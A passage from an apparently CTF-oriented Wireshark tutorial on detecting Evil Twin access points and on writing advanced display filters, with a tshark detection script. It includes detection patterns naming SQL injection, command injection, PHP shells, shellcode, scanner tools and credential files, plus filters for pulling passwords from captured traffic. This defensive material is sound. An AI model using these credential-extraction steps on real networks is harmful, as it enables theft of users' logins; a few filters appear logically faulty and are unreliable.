**RSN (Robust Security Network) Information Element:**

```bash
# Check RSN capabilities
wlan.rsn.version
wlan.rsn.pcs.type  # Pairwise Cipher Suite
wlan.rsn.gcs.type  # Group Cipher Suite
wlan.rsn.akm.type  # Authentication Key Management

# Legitimate APs typically have consistent RSN info
# Evil Twins may have different or missing RSN IE
```

**Downgrade Attack Detection:**

```bash
# Legitimate network uses WPA2/WPA3
# Evil Twin uses Open or WEP (weaker encryption)

# Filter for Open networks
wlan.fc.type_subtype == 8 && !(wlan.wep.key || wlan.rsn.version)

# Filter for WEP (deprecated, highly suspicious)
wlan.fc.type_subtype == 8 && wlan.wep.key
```

### Vendor-Specific Information Elements

**Check for Vendor Extensions:**

```bash
# Vendor-specific IEs
wlan.tag.number == 221

# Extract vendor OUI from IE
wlan.tag.oui

# Legitimate APs often include vendor-specific features
# Evil Twins may lack these or have inconsistent vendor IEs
```

**WPS (Wi-Fi Protected Setup) Indicators:**

```bash
# WPS enabled (often disabled on secure networks)
wlan.wps.wifi_protected_setup_state

# Evil Twins may enable WPS for easier client connection
# or disable it if legitimate network uses it
```

### Temporal Analysis for Evil Twins

**AP Appearance Timeline:**

```bash
# When did each BSSID first appear?
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields \
-e frame.time -e wlan.ssid -e wlan.bssid | sort -u

# Evil Twin typically appears after legitimate AP
# May coincide with deauthentication attacks
```

**Simultaneous Beacon Timing:**

```bash
# Extract beacon times for same SSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8 && wlan.ssid == 'TargetNetwork'" \
-T fields -e frame.time_relative -e wlan.bssid

# Two APs with same SSID sending beacons at same time = Evil Twin
```

### Analyzing Probe Responses

**Inconsistent Probe Responses:**

```bash
# Legitimate AP responds to probe requests consistently
# Evil Twin may have different response patterns

# Extract probe responses
wlan.fc.type_subtype == 5

# Compare responses for same SSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 5 && wlan.ssid == 'TargetNetwork'" \
-T fields -e wlan.bssid -e wlan.rsn.akm.type -e wlan_radio.channel
```

### Captive Portal Detection

Evil Twins often use captive portals to harvest credentials.

**HTTP Redirect Detection:**

```bash
# Look for HTTP redirects after connection
http.response.code == 302 || http.response.code == 301

# Check Location header
http.location contains "login" || http.location contains "portal"

# DNS hijacking (all queries resolve to same IP)
tshark -r capture.cap -Y "dns.a" -T fields -e dns.qry.name -e dns.a | \
awk '{print $2}' | sort -u

# If all domains resolve to single IP, likely captive portal
```

**Fake Login Pages:**

```bash
# Extract HTTP content
http && frame contains "password"

# Look for credential submission
http.request.method == "POST" && http.file_data contains "password"

# Export objects to examine login pages
# File → Export Objects → HTTP
```

### Client Behavior Analysis

**Repeated Connections:**

```bash
# Client connecting to multiple BSSIDs with same SSID
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0" -T fields \
-e wlan.sa -e wlan.da

# Frequent reassociation indicates client bouncing between legitimate and evil twin
```

**Authentication Patterns:**

```bash
# Look for authentication frames
wlan.fc.type_subtype == 11

# Multiple authentications to different BSSIDs
tshark -r capture.cap -Y "wlan.fc.type_subtype == 11" -T fields \
-e wlan.sa -e wlan.da -e frame.time
```

### Using Airgraph-ng for Visualization

```bash
# Install airgraph-ng
sudo apt install airgraph-ng

# Generate client-to-AP relationship graph
airgraph-ng -i capture-01.csv -o client_graph.png -g CAPR

# Generate client probe graph
airgraph-ng -i capture-01.csv -o probe_graph.png -g CPG

# Visual inspection helps identify:
# - Clients connected to multiple APs with same SSID
# - Rogue APs with unusual client connections
```

### Comprehensive Evil Twin Detection Script

```bash
#!/bin/bash
# evil_twin_detector.sh

PCAP=$1

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <pcap_file>"
    exit 1
fi

echo "[*] Evil Twin Detection Analysis"
echo "================================"
echo

# Extract unique SSID/BSSID combinations
echo "[*] Analyzing SSIDs and BSSIDs..."
SSID_BSSID=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 8" -T fields \
-e wlan.ssid -e wlan.bssid 2>/dev/null | grep -v "^$" | sort -u)

# Check for duplicate SSIDs
DUPLICATE_SSIDS=$(echo "$SSID_BSSID" | cut -f1 | sort | uniq -d)

if [ -n "$DUPLICATE_SSIDS" ]; then
    echo "[!] POTENTIAL EVIL TWIN DETECTED"
    echo "[!] The following SSIDs have multiple BSSIDs:"
    echo
    
    while IFS= read -r ssid; do
        echo "  SSID: $ssid"
        echo "$SSID_BSSID" | grep "^$ssid" | while IFS=$'\t' read -r s bssid; do
            echo "    BSSID: $bssid"
            
            # Check channel
            CHANNEL=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 8 && wlan.bssid == $bssid" \
            -T fields -e wlan_radio.channel 2>/dev/null | head -1)
            echo "      Channel: $CHANNEL"
            
            # Check encryption
            CRYPTO=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 8 && wlan.bssid == $bssid" \
            -T fields -e wlan.rsn.akm.type 2>/dev/null | head -1)
            if [ -z "$CRYPTO" ]; then
                echo "      Encryption: Open/WEP [!]"
            else
                echo "      Encryption: WPA/WPA2"
            fi
            
            # Check if locally administered MAC
            FIRST_BYTE=$(echo "$bssid" | cut -d: -f1)
            SECOND_DIGIT=$(echo "$FIRST_BYTE" | cut -c2)
            if [[ "$SECOND_DIGIT" =~ [2367AaBbEeFf] ]]; then
                echo "      [!] WARNING: Locally administered MAC address"
            fi
            
            echo
        done
    done <<< "$DUPLICATE_SSIDS"
else
    echo "[+] No duplicate SSIDs detected"
fi

# Check for deauth attacks (common with Evil Twin)
echo
echo "[*] Checking for deauthentication attacks..."
DEAUTH_COUNT=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 12" 2>/dev/null | wc -l)
if [ "$DEAUTH_COUNT" -gt 20 ]; then
    echo "[!] WARNING: $DEAUTH_COUNT deauthentication frames detected"
    echo "[!] This often accompanies Evil Twin attacks"
else
    echo "[+] Deauth count appears normal ($DEAUTH_COUNT frames)"
fi

# Check for open networks (potential Evil Twin tactic)
echo
echo "[*] Checking for open networks..."
OPEN_NETS=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype == 8 && !(wlan.wep.key || wlan.rsn.version)" \
-T fields -e wlan.ssid -e wlan.bssid 2>/dev/null | grep -v "^$" | sort -u)

if [ -n "$OPEN_NETS" ]; then
    echo "[!] Open networks detected:"
    echo "$OPEN_NETS" | while IFS=$'\t' read -r ssid bssid; do
        echo "  SSID: $ssid, BSSID: $bssid"
    done
else
    echo "[+] No open networks detected"
fi

echo
echo "[*] Analysis complete"
```

### Real-Time Evil Twin Detection

**Using Kismet:**

```bash
# Kismet automatically detects Evil Twins
kismet -c wlan0mon

# Web interface shows alerts for:
# - BSSIDCONFLICT: Same SSID, different BSSID
# - DHCPCONFLICT: Multiple DHCP servers
# - CRYPTODROP: Encryption downgrade
```

**Using Wireless IDS (WIDS):**

[Inference: Implementation-specific] Enterprise WIDS solutions can detect Evil Twins through:

- RF fingerprinting
- Known AP database
- Anomalous signal patterns
- Encryption mismatch detection

### WPA3 Evil Twin Considerations

**WPA3 Protections:**

- SAE (Simultaneous Authentication of Equals) instead of PSK
- Protected Management Frames mandatory
- Forward secrecy
- Resistance to offline dictionary attacks

**Evil Twin Tactics Against WPA3:**

- Downgrade to WPA2 (if client supports both)
- Exploit transition mode (WPA2/WPA3)
- Social engineering (fake captive portal)

```bash
# Detect WPA3 networks
wlan.rsn.akm.type == 8  # SAE

# Detect WPA2/WPA3 transition mode
wlan.rsn.akm.type == 2 || wlan.rsn.akm.type == 8
```

### Practical CTF Evil Twin Scenarios

**Scenario 1: Credential Harvesting**

```bash
# 1. Identify Evil Twin
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8" -T fields \
-e wlan.ssid -e wlan.bssid | sort -u

# 2. Find client connections to Evil Twin
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0 && wlan.da == EVIL_TWIN_BSSID" \
-T fields -e wlan.sa

# 3. Extract HTTP traffic from connected clients
tshark -r capture.cap -Y "wlan.bssid == EVIL_TWIN_BSSID && http" \
-T fields -e http.request.uri -e http.file_data

# 4. Look for credentials
tshark -r capture.cap -Y "http.request.method == POST && wlan.bssid == EVIL_TWIN_BSSID" \
-T fields -e http.file_data | grep -i "password"
```

**Scenario 2: Flag in Rogue AP Configuration**

```bash
# Extract beacon frame details
tshark -r capture.cap -Y "wlan.fc.type_subtype == 8 && wlan.bssid == ROGUE_BSSID" \
-V | less

# Check for unusual information elements
# Flags may be hidden in:
# - Vendor-specific IEs
# - SSID (encoded)
# - WPS information
```

**Scenario 3: MITM Traffic Analysis**

```bash
# Evil Twin acts as MITM
# Analyze traffic flowing through rogue AP

# Find client → Evil Twin → Internet traffic
# Extract interesting HTTP requests
tshark -r capture.cap -Y "http && wlan.bssid == EVIL_TWIN_BSSID" \
-T fields -e http.host -e http.request.uri
```

### Important Considerations

1. **Legal Warning**: Active wireless attacks (deauth, Evil Twin deployment) are illegal without authorization. Analysis of captures is permissible for educational/forensic purposes.
    
2. **PMF Effectiveness**: Networks with Protected Management Frames are resistant to deauthentication attacks, making Evil Twin attacks more difficult.
    
3. **Client Stickiness**: Modern clients may prefer known BSSIDs even if rogue AP has stronger signal.
    
4. **5GHz vs 2.4GHz**: Evil Twins often operate on less congested 5GHz band or same band as legitimate AP.
    
5. **Detection Evasion**: Sophisticated Evil Twins may:
    
    - Clone all characteristics of legitimate AP
    - Use timing to avoid simultaneous beaconing
    - Employ MAC address randomization
    - Disable logging/monitoring features

### Related Topics

Advanced wireless analysis topics include: WPS PIN cracking, WPA3 SAE handshake analysis, Bluetooth traffic analysis, Zigbee/IoT protocol analysis, RF spectrum analysis, and software-defined radio (SDR) applications.

---

# Advanced Filtering Techniques

## Complex Boolean Filters

### Boolean Operators Fundamentals

**Primary Operators:**

```
AND (&&)  - Both conditions must be true
OR  (||)  - Either condition must be true
NOT (!)   - Negates the condition
XOR (^^)  - Exactly one condition must be true (not both)
```

**Operator Precedence (highest to lowest):**

```
1. Parentheses ()
2. Unary NOT (!)
3. Comparison operators (==, !=, <, >, <=, >=)
4. Logical AND (&&)
5. Logical OR (||)
6. Logical XOR (^^)
```

### Multi-Layer Protocol Filtering

**TCP/IP Stack Filtering:**

```bash
# HTTP POST requests with specific content type and large payload
(http.request.method == "POST") && 
(http.content_type contains "application/json") && 
(tcp.len > 1000)

# TLS handshake with weak ciphers on non-standard ports
(ssl.handshake.type == 1) && 
(ssl.handshake.ciphersuite < 0x0030 || ssl.handshake.ciphersuite == 0x0000) && 
(tcp.port != 443)

# DNS queries to suspicious TLDs with long query names
(dns.qry.name.len > 50) && 
(dns.qry.type == 1) && 
(dns.qry.name contains ".xyz" || dns.qry.name contains ".top" || dns.qry.name contains ".tk")

# IPv4 fragmented packets from specific subnet with evil bit set
(ip.flags.mf == 1 || ip.frag_offset > 0) && 
(ip.src == 192.168.1.0/24) && 
(ip.flags.rb == 1)
```

**Application Layer Combinations:**

```bash
# FTP with embedded credentials in cleartext
(ftp.request.command == "USER" || ftp.request.command == "PASS") && 
(ftp.request.arg)

# SMTP with suspicious attachments
(smtp) && 
(mime.content_type contains "application/x-msdownload" || 
 mime.content_type contains "application/x-executable") &&
(smtp.data.fragment)

# HTTP authentication attempts with user agent anomalies
(http.authorization) && 
(http.user_agent contains "sqlmap" || 
 http.user_agent contains "nikto" || 
 http.user_agent contains "nmap")

# SMB with IPC$ or ADMIN$ share access attempts
(smb2.cmd == 3) && 
(smb2.tree contains "IPC$" || smb2.tree contains "ADMIN$" || smb2.tree contains "C$")
```

### Network Behavior Analysis Filters

**Connection Pattern Detection:**

```bash
# Port scanning detection (SYN to multiple ports from same source)
(tcp.flags.syn == 1) && (tcp.flags.ack == 0) && 
(tcp.window_size <= 1024)

# Combine with conversation filter for single source
(tcp.flags.syn == 1) && (tcp.flags.ack == 0) && 
(ip.src == 192.168.1.100) && 
(tcp.dstport != tcp.dstport)  # [Inference] Multiple destination ports

# SYN flood detection
(tcp.flags.syn == 1) && (tcp.flags.ack == 0) && 
(ip.dst == 192.168.1.10) && 
!(tcp.analysis.retransmission)

# Beacon activity (C2 communication)
(tcp.len > 0 && tcp.len < 100) && 
(ip.dst == 203.0.113.50) && 
(frame.time_delta > 0.9 && frame.time_delta < 1.1)

# Data exfiltration pattern (large outbound, small inbound)
(ip.src == 192.168.1.0/24) && 
(tcp.len > 1400) && 
(ip.dst != 192.168.0.0/16 && ip.dst != 10.0.0.0/8)
```

**Protocol Anomaly Detection:**

```bash
# HTTP on non-standard ports
(http) && (tcp.port != 80 && tcp.port != 8080 && tcp.port != 443 && tcp.port != 8443)

# TLS/SSL without proper handshake sequence
(ssl.record.content_type == 23) && 
!(ssl.handshake.type)

# DNS response without corresponding query
(dns.flags.response == 1) && 
!(dns.qry.name)

# ICMP tunneling detection (unusual payload sizes)
(icmp.type == 8 || icmp.type == 0) && 
(data.len > 64)

# ARP spoofing detection (duplicate IP with different MAC)
(arp.opcode == 2) && 
((arp.src.proto_ipv4 == 192.168.1.1 && arp.src.hw_mac != aa:bb:cc:dd:ee:ff) || 
 (arp.src.proto_ipv4 == 192.168.1.254 && arp.src.hw_mac != 11:22:33:44:55:66))
```

### Time-Based Filtering

**Absolute Time Filters:**

```bash
# Specific date and time range
(frame.time >= "2025-10-19 08:00:00") && 
(frame.time <= "2025-10-19 17:00:00")

# After specific timestamp
frame.time > "2025-10-19 12:30:45"

# Before specific timestamp
frame.time < "2025-10-19 09:00:00"

# Specific hour range (business hours)
(frame.time >= "2025-10-19 09:00:00" && frame.time <= "2025-10-19 17:00:00")
```

**Relative Time Filters:**

```bash
# Packets within first 10 seconds of capture
frame.time_relative < 10

# Packets after 5 minutes into capture
frame.time_relative > 300

# Time delta between packets (inter-packet timing)
frame.time_delta > 1.0  # More than 1 second gap

# Time since previous packet in same conversation
tcp.time_delta > 5.0

# Retransmissions after specific delay
(tcp.analysis.retransmission) && (tcp.time_delta > 0.2)
```

**Timing Pattern Analysis:**

```bash
# Regular interval beaconing (C2 traffic)
(tcp.len > 0) && 
(ip.dst == 203.0.113.100) && 
(frame.time_delta > 59.5 && frame.time_delta < 60.5)

# Burst traffic detection
(tcp.len > 1400) && 
(frame.time_delta < 0.001)

# Slow connection establishment (potential evasion)
(tcp.flags.syn == 1) && 
(tcp.time_relative > 5.0)
```

### Size-Based Filtering

**Payload Size Filters:**

```bash
# Large HTTP responses (potential data exfiltration)
(http.response) && 
(http.content_length > 1000000)

# Small SSH packets (interactive session)
(tcp.port == 22) && 
(tcp.len > 0 && tcp.len < 100) && 
(tcp.len != 0)

# DNS queries with unusual length (tunneling)
(dns.qry.name.len > 100) || 
(dns.resp.len > 512)

# Jumbo frames
frame.len > 1514

# Fragmented IP packets
(ip.frag_offset > 0) || (ip.flags.mf == 1)

# TCP with maximum segment size
(tcp.len == 1460) || (tcp.len == 1448)  # Accounting for headers
```

**Frame Length Patterns:**

```bash
# Specific frame size (possible covert channel)
frame.len == 1337

# Frame size range
(frame.len >= 100) && (frame.len <= 500)

# Padding detection (exact multiples)
(frame.len % 16 == 0) && (frame.len > 1000)

# Zero-length TCP payloads (keepalives, ACKs)
(tcp.len == 0) && (tcp.flags.ack == 1)
```

### Address-Based Complex Filters

**Network Topology Filters:**

```bash
# Internal to internal communication (lateral movement)
(ip.src == 192.168.1.0/24) && 
(ip.dst == 192.168.1.0/24) && 
(ip.src != ip.dst)

# External to internal on sensitive ports
(!(ip.src == 10.0.0.0/8 || ip.src == 172.16.0.0/12 || ip.src == 192.168.0.0/16)) && 
((ip.dst == 192.168.1.0/24) && 
(tcp.port == 3389 || tcp.port == 22 || tcp.port == 445))

# Multicast traffic from specific source
(ip.dst >= 224.0.0.0 && ip.dst <= 239.255.255.255) && 
(ip.src == 192.168.1.50)

# Broadcast traffic excluding ARP and DHCP
(eth.dst == ff:ff:ff:ff:ff:ff) && 
!(arp || bootp)

# Cross-subnet communication (potential misconfiguration)
((ip.src == 192.168.1.0/24) && (ip.dst == 192.168.2.0/24)) || 
((ip.src == 192.168.2.0/24) && (ip.dst == 192.168.1.0/24))
```

**MAC Address Filtering:**

```bash
# Vendor-specific MAC prefix (Apple devices)
(eth.src[0:3] == 00:03:93 || 
 eth.src[0:3] == 00:05:02 || 
 eth.src[0:3] == 00:0a:95)

# Locally administered addresses (potential spoofing)
(eth.src[0] & 0x02)

# Multicast MAC addresses
(eth.dst[0] & 0x01)

# Specific MAC vendor excluding specific device
(eth.addr[0:3] == 00:50:56) && (eth.addr != 00:50:56:aa:bb:cc)
```

### Protocol State and Flag Combinations

**TCP State Analysis:**

```bash
# SYN-ACK responses from specific server
(tcp.flags == 0x012) && 
(ip.src == 192.168.1.10)

# RST packets without prior SYN
(tcp.flags.reset == 1) && 
!(tcp.flags.syn == 1)

# FIN-ACK from client side
(tcp.flags == 0x011) && 
(ip.src == 192.168.1.0/24)

# Unusual flag combinations (potential evasion)
(tcp.flags.syn == 1 && tcp.flags.fin == 1) || 
(tcp.flags.syn == 1 && tcp.flags.reset == 1) || 
(tcp.flags == 0x000)  # Null scan

# PSH-ACK with payload (interactive data)
(tcp.flags == 0x018) && 
(tcp.len > 0)

# TCP window size anomalies
(tcp.flags.syn == 1) && 
(tcp.window_size == 0 || tcp.window_size > 65535)
```

**Connection State Tracking:**

```bash
# Three-way handshake completion
(tcp.flags.syn == 1 && tcp.flags.ack == 0) || 
(tcp.flags.syn == 1 && tcp.flags.ack == 1) || 
(tcp.flags.syn == 0 && tcp.flags.ack == 1 && tcp.seq == 1)

# Connection teardown
(tcp.flags.fin == 1) || (tcp.flags.reset == 1)

# Established connections with data transfer
(tcp.flags.ack == 1) && 
(tcp.len > 0) && 
!(tcp.flags.syn == 1)
```

### Error and Retransmission Analysis

**TCP Analysis Filters:**

```bash
# Retransmissions from specific host
(tcp.analysis.retransmission) && 
(ip.src == 192.168.1.100)

# Fast retransmissions (network congestion)
(tcp.analysis.fast_retransmission)

# Duplicate ACKs
(tcp.analysis.duplicate_ack)

# Zero window conditions (buffer full)
(tcp.analysis.zero_window)

# Out-of-order segments
(tcp.analysis.out_of_order)

# Multiple issues combined
(tcp.analysis.retransmission || tcp.analysis.fast_retransmission) && 
(ip.src == 192.168.1.0/24) && 
(tcp.time_delta > 0.1)

# Lost segments
(tcp.analysis.lost_segment)

# ACKed unseen segment (possible packet loss)
(tcp.analysis.ack_lost_segment)
```

**ICMP Error Messages:**

```bash
# Destination unreachable messages
(icmp.type == 3)

# Port unreachable specifically
(icmp.type == 3) && (icmp.code == 3)

# TTL exceeded (traceroute detection)
(icmp.type == 11)

# ICMP redirects (potential MITM)
(icmp.type == 5)

# Fragmentation needed but DF set (MTU issues)
(icmp.type == 3) && (icmp.code == 4)
```

### Encrypted Traffic Analysis

**TLS/SSL Inspection:**

```bash
# TLS 1.0 and 1.1 (deprecated versions)
(ssl.record.version == 0x0301) || (ssl.record.version == 0x0302)

# Client Hello with specific cipher suites
(ssl.handshake.type == 1) && 
(ssl.handshake.ciphersuite == 0x0000 || 
 ssl.handshake.ciphersuite == 0x0001 || 
 ssl.handshake.ciphersuite == 0x0002)

# Server Hello with weak cipher selected
(ssl.handshake.type == 2) && 
(ssl.handshake.ciphersuite < 0x0030)

# Certificate chains with specific CA
(ssl.handshake.type == 11) && 
(x509sat.CountryName == "CN" || x509sat.CountryName == "RU")

# SNI for specific domains
(ssl.handshake.extensions_server_name contains "example.com") || 
(ssl.handshake.extensions_server_name contains "malicious.net")

# Encrypted alerts (connection issues)
(ssl.alert_message) && 
(ssl.record.content_type == 21)

# Certificate warnings
(ssl.alert_message.desc == 42) ||  # Bad certificate
(ssl.alert_message.desc == 43) ||  # Unsupported certificate
(ssl.alert_message.desc == 44) ||  # Certificate revoked
(ssl.alert_message.desc == 45)     # Certificate expired
```

**VPN Traffic Analysis:**

```bash
# OpenVPN with specific opcodes
(udp.port == 1194) && 
(data[0:1] == 38 || data[0:1] == 40)

# IPsec IKE negotiations
(isakmp.messageid == 0) && 
(isakmp.nextpayload == 1)

# ESP with unusual SPIs
(esp) && (esp.spi > 0xffff0000)

# WireGuard handshake patterns
(udp.port == 51820) && 
(udp.length == 148 || udp.length == 92)
```

### CTF-Specific Complex Filters

**Data Exfiltration Detection:**

```bash
# Base64 in HTTP requests (common exfil method)
(http.request.uri contains "data=") && 
(http.request.uri.len > 100) && 
(http.request.uri matches "[A-Za-z0-9+/=]{50,}")

# DNS tunneling indicators
(dns.qry.name.len > 50) && 
(dns.qry.name matches "^[a-f0-9]{32,}") && 
(dns.qry.type == 16)  # TXT records

# ICMP with encoded payload
(icmp.type == 8) && 
(data.len > 100) && 
(data.data matches "[0-9A-Fa-f]{64,}")

# HTTP POST with encoded data
(http.request.method == "POST") && 
(http.file_data.len > 1000) && 
(http.content_type contains "text/plain" || http.content_type contains "application/x-www-form-urlencoded")
```

**Steganography and Covert Channels:**

```bash
# TCP ISN patterns (covert channel)
(tcp.flags.syn == 1) && 
(tcp.seq % 256 >= 32 && tcp.seq % 256 <= 126)

# ICMP ID field patterns
(icmp.type == 8) && 
(icmp.ident >= 0x2000 && icmp.ident <= 0x7e7e)

# IP ID field sequential patterns
(ip.id % 2 == 0) || (ip.id % 3 == 0)

# HTTP timing covert channel
(http.response) && 
(http.time > 1.0) && 
(http.content_length < 1000)
```

---

## Regular Expression Filtering

### Regex Syntax in Wireshark

**Supported Regex Operators:**

```
.       - Any single character
*       - Zero or more of previous
+       - One or more of previous
?       - Zero or one of previous
^       - Start of string
$       - End of string
[]      - Character class
[^]     - Negated character class
|       - Alternation (OR)
()      - Grouping
{n}     - Exactly n occurrences
{n,}    - At least n occurrences
{n,m}   - Between n and m occurrences
\       - Escape character
```

**Wireshark Regex Operators:**

```
contains  - Simple substring match (no regex)
matches   - PCRE (Perl Compatible Regular Expression)
~         - Alternative syntax for matches (deprecated)
```

### String Pattern Matching

**HTTP Content Patterns:**

```bash
# SQL injection attempts in URI
http.request.uri matches "(?i)(union|select|insert|update|delete|drop|exec|script)"

# XSS attempts
http.request.uri matches "(?i)(<script|javascript:|onerror=|onload=)"

# Directory traversal
http.request.uri matches "\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e\\\\"

# Command injection
http.request.uri matches "(?i)(;|\\||&|`|\\$\\(|\\${)"

# PHP shells
http.file_data matches "(?i)(eval\\(|base64_decode|system\\(|exec\\(|shell_exec)"

# Email addresses in payload
http.file_data matches "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"

# Credit card patterns (PAN)
data.text matches "\\b[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\\b"

# Social Security Numbers
data.text matches "\\b[0-9]{3}-[0-9]{2}-[0-9]{4}\\b"

# IPv4 addresses in data
data.text matches "\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b"

# URLs in cleartext
data.text matches "https?://[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[/a-zA-Z0-9.?=&-]*"
```

**DNS Query Patterns:**

```bash
# DGA (Domain Generation Algorithm) detection
dns.qry.name matches "^[a-z]{10,}\\.(com|net|org)$"

# Subdomain enumeration
dns.qry.name matches "^[a-z0-9-]{8,}\\..+\\..+$"

# Base32/Base64 encoded subdomains
dns.qry.name matches "^[A-Z2-7]{32}\\."

# Punycode domains (IDN homograph attacks)
dns.qry.name matches "xn--"

# Numbered subdomains (scanning)
dns.qry.name matches "^[0-9]+\\."

# Long random subdomains (tunneling)
dns.qry.name matches "^[a-f0-9]{40,}\\."
```

**Username and Credential Patterns:**

```bash
# FTP credentials
ftp.request.arg matches "(?i)(admin|root|user|test|guest|administrator)"

# HTTP Basic Auth headers
http.authorization matches "Basic [A-Za-z0-9+/=]+"

# SMTP AUTH attempts
smtp.req.command matches "AUTH" && smtp.req.parameter matches "[A-Za-z0-9+/=]{20,}"

# Common usernames in HTTP forms
http.file_data matches "(?i)(username|user|login)=[a-zA-Z0-9]+"

# Password fields
http.file_data matches "(?i)(password|passwd|pwd)=[^&\\s]+"

# API keys and tokens
http.request.uri matches "(?i)(api_key|apikey|token|access_token)=[A-Za-z0-9_-]{20,}"
```

### Binary Pattern Matching

**Executable Detection:**

```bash
# PE file magic bytes
data.data matches "^4d5a"  # MZ header

# ELF executables
data.data matches "^7f454c46"  # \x7fELF

# Mach-O binaries
data.data matches "^(cafebabe|feedface|cefaedfe)"

# ZIP archives (including JAR, DOCX, etc.)
data.data matches "^504b0304"  # PK\x03\x04

# RAR archives
data.data matches "^526172211a07"  # Rar!\x1a\x07

# PDF files
data.data matches "^255044462d"  # %PDF-

# JPEG images
data.data matches "^ffd8ff"

# PNG images
data.data matches "^89504e47"

# GIF images
data.data matches "^474946383[79]61"  # GIF87a or GIF89a
```

**Shellcode Patterns:**

```bash
# NOP sleds
data.data matches "(90){20,}"  # 20+ consecutive NOPs

# Common x86 shellcode patterns
data.data matches "(31c0|31db|31c9|31d2|50|53|51|52|b0)"

# Windows shellcode (LoadLibrary patterns)
data.data matches "(?i)kernel32|LoadLibrary|GetProcAddress"

# Linux shellcode (execve patterns)
data.data matches "(?i)/bin/sh|execve"

# Metasploit patterns
data.data matches "(?i)meterpreter|metasploit"
```

### Protocol-Specific Regex

**SMB/CIFS Patterns:**

```bash
# Named pipe access
smb2.filename matches "\\\\pipe\\\\"

# Administrative shares
smb2.filename matches "\\$\\$"

# Suspicious file operations
smb2.filename matches "(?i)(\\.exe|\\.dll|\\.bat|\\.ps1|\\.vbs)$"

# Share enumeration
smb2.filename matches "^\\\\[a-zA-Z0-9-]+\\\\[A-Z]\\$$"

# Credential files
smb2.filename matches "(?i)(ntds\\.dit|sam|system|security|credentials)"
```

**LDAP Query Patterns:**

```bash
# LDAP injection attempts
ldap.filter matches "(?i)(\\*\\)|\\(\\||\\(&)"

# Password attribute queries
ldap.AttributeDescription matches "(?i)(userPassword|unicodePwd)"

# Administrative account enumeration
ldap.filter matches "(?i)(cn=admin|memberOf=.*Admin)"
```

**HTTP User-Agent Analysis:**

```bash
# Scanner user agents
http.user_agent matches "(?i)(nikto|nmap|masscan|sqlmap|burp|acunetix|nessus|openvas|metasploit)"

# Programming language libraries
http.user_agent matches "(?i)(python-requests|curl|wget|java|perl|ruby|go-http)"

# Automated tools
http.user_agent matches "(?i)(bot|crawler|spider|scraper)"

# Suspicious or generic agents
http.user_agent matches "(?i)(^mozilla/5\\.0$|user-agent|test)"

# Mobile vs desktop patterns
http.user_agent matches "(?i)(android|iphone|ipad|mobile)"

# Outdated browsers
http.user_agent matches "(?i)(MSIE [1-9]\\.|Trident/[1-5]\\.|Firefox/[1-3][0-9]\\.)"
```

### Advanced Regex Combinations

**Multi-Field Regex Matching:**

```bash
# SQL injection with specific user agent
(http.request.uri matches "(?i)(union.*select|insert.*into)") && 
(http.user_agent matches "(?i)(sqlmap|havij)")

# XSS attempt from external source
(http.request.uri matches "(?i)(<script|javascript:)") && 
(!(ip.src == 192.168.0.0/16 || ip.src == 10.0.0.0/8))

# File upload with executable extension
(http.request.method == "POST") && 
(http.content_type matches "multipart/form-data") && 
(http.file_data matches "filename=.*\\.(exe|dll|bat|ps1|sh)")

# Base64 encoded payload in specific parameter
(http.request.uri matches "data=[A-Za-z0-9+/=]{100,}") && 
(http.request.uri matches "(?i)(cmd|exec|eval)")
```

**Temporal Regex Patterns:**

```bash
# Timestamped data patterns
data.text matches "[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}"

# Unix timestamps
data.text matches "\\b[0-9]{10}\\b"

# Session IDs with timestamp component
http.cookie matches "session=[0-9]{10}[a-f0-9]{32}"

# JWT tokens (three base64 parts)
http.authorization matches "Bearer [A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
```

### Case-Insensitive and Unicode Handling

**Case-Insensitive Matching:**

```bash
# Using (?i) flag
http.host matches "(?i)example\\.com"

# Alternative syntax (older Wireshark versions)
lower(http.host) contains "example.com"

# Mixed case evasion detection
http.request.uri matches "(?i)s[eE3][lL1][eE3][cC][tT]"
```

**Unicode and Encoding:**

```bash
# URL-encoded patterns
http.request.uri matches "%[0-9A-Fa-f]{2}"

# Double encoding
http.request.uri matches "%25[0-9A-Fa-f]{2}"

# Unicode escapes
http.request.uri matches "\\\\u[0-9A-Fa-f]{4}"

# HTML entities
http.file_data matches "&(#[0-9]+|#x[0-9A-Fa-f]+|[a-z]+);"

# UTF-8 multi-byte sequences
data.data matches "(c[2-9a-f]|d[0-9a-f]|e[0-9a-f]|f[0-4])[89ab][89ab]"
```

### Performance Considerations

**Optimizing Regex Filters:**

```bash
# Inefficient: Backtracking-heavy
http.request.uri matches ".*admin.*"

# Better: Anchored or bounded
http.request.uri matches "^/admin/"

# Inefficient: Multiple alternations
data.text matches "(password|passwd|pwd|pass|pw)"

# Better: Character class optimization
data.text matches "pass(word|wd|w?)?"

# Combining with non-regex filters first
(tcp.port == 80) && (http.request.uri matches "pattern")
# Rather than:
(http.request.uri matches "pattern") && (tcp.port == 80)
```

---

## Macros & Filter Buttons

### Creating Filter Macros

**Macro Definition Syntax:**

Macros are defined in: **Edit → Preferences → Filter Expressions**

**Basic Macro Structure:**

```
Label: Web Traffic
Filter: (http || https || tcp.port == 8080 || tcp.port == 8443)

Label: Internal Network
Filter: (ip.src == 192.168.0.0/16 || ip.dst == 192.168.0.0/16)

Label: Suspicious Ports
Filter: (tcp.port == 4444 || tcp.port == 5555 || tcp.port == 31337 || tcp.port == 12345)
```

### Configuring Filter Macros

**Access Methods:**

1. **Via GUI:**
    
    - Edit → Preferences → Filter Expressions
    - Click "+" to add new macro
    - Enter Label and Filter expression
